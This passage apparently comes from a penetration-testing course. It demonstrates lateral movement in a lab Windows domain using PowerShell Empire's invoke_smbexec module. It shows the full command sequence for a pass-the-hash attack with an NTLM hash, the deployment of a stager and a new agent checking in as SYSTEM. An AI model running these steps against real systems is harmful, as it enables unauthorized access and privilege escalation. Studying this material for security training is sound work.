Once we gain valid user credentials, we can use them to log into additional systems until we reach our objective. This is known as lateral movement.

In our labs, the domain controller is located on an internal network, meaning we can not reach it from our Kali VM. To demonstrate the mechanics of lateral movement within Empire, we'll obtain another shell on the Windows 10 client in the context of a different user.

Although this example is simplified because of the single target VM, the mechanics of the process will be the same when moving to a different remote host in a real-world situation.

There are various vectors in the _lateral_movement_ category that we can use to invoke an Empire agent on a remote host:

```
(Empire: K678VC13) > usemodule lateral_movement/technique
inveigh_relay           invoke_psremoting       invoke_wmi
invoke_dcom             invoke_smbexec          invoke_wmi_debugger
invoke_executemsbuild   invoke_sqloscmd         jenkins_script_console
invoke_psexec           invoke_sshcommand       new_gpo_immediate_task
```

As an example we will try out the _invoke_smbexec_ module, which requires several parameters.

We'll set _ComputerName_ to the hostname of the Windows 10 client (client251) and set _Listener_ to "http". We will also set the _Username_, _Domain_, and _Hash_ parameters using the relevant data from the _jeff_admin_ user account found in the previous section (Listing 25). This is configured in (Listing 27).

We can use either the _set CredID_ command to specify the ID number of the entry from the credentials store or manually enter all the credentials. Note that in this case, the passwords for both Offsec and Jeff_admin coincide.

```
(Empire: K678VC13) > usemodule lateral_movement/invoke_smbexec

(Empire: powershell/lateral_movement/invoke_smbexec) > info

              Name: Invoke-SMBExec
            Module: powershell/lateral_movement/invoke_smbexec
        NeedsAdmin: False
         OpsecSafe: True
          Language: powershell
MinLanguageVersion: 2
        Background: False
   OutputExtension: None

...

Options:

Name         Required    Value         Description
----         --------    -------       -----------
CredID       False                     CredID from the store to use.           
ComputerName True                      Host[s] to execute the stager on, comma 
                                       separated.                              
Service      False                     Name of service to create and delete.   
                                       Defaults to 20 char random.             
ProxyCreds   False       default       Proxy credentials                       
                                       ([domain\]username:password) to use for 
                                       request (default, none, or other).      
Username     True                      Username.                               
Domain       False                     Domain.                                 
Hash         True                      NTLM Hash in LM:NTLM or NTLM format.    
Agent        True        K678VC13      Agent to run module on.                 
Listener     True                      Listener to use.                        
...     

(Empire: powershell/lateral_movement/invoke_smbexec) > set ComputerName client251

(Empire: powershell/lateral_movement/invoke_smbexec) > set Listener http

(Empire: powershell/lateral_movement/invoke_smbexec) > set Username jeff_admin

(Empire: powershell/lateral_movement/invoke_smbexec) > set Hash e2b475c11da2a0748290d87aa966c327

(Empire: powershell/lateral_movement/invoke_smbexec) > set Domain corp.com

(Empire: powershell/lateral_movement/invoke_smbexec) > execute
Command executed with service CVTERKCMPMMECQLRWLKB on client251

[*] Sending POWERSHELL stager (stage 1) to 10.11.0.22
[*] New agent UXVZ2NC3 checked in
[+] Initial agent UXVZ2NC3 from 10.11.0.22 now active (Slack)
...
```

Excellent! The agent was successfully deployed and we can now interact with it:

```
(Empire: K678VC13) > agents

[*] Active agents:

Name      Lang  Internal IP  Machine Name    Username      Process             Delay
--------- ----  -----------  ------------    ---------     -------             -----
S2Y5XW1L  ps    10.11.0.22   CLIENT251       corp\offsec   powershell/2976     5/0.0
DWZ49BAP  ps    10.11.0.22   CLIENT251       corp\offsec   explorer/3568       5/0.0
K678VC13  ps    10.11.0.22   CLIENT251       *corp\offsec  powershell/6236     5/0.0
UXVZ2NC3  ps    10.11.0.22   CLIENT251       *corp\SYSTEM  powershell/3912     5/0.0

(Empire: agents) > interact UXVZ2NC3
(Empire: UXVZ2NC3) > 
```
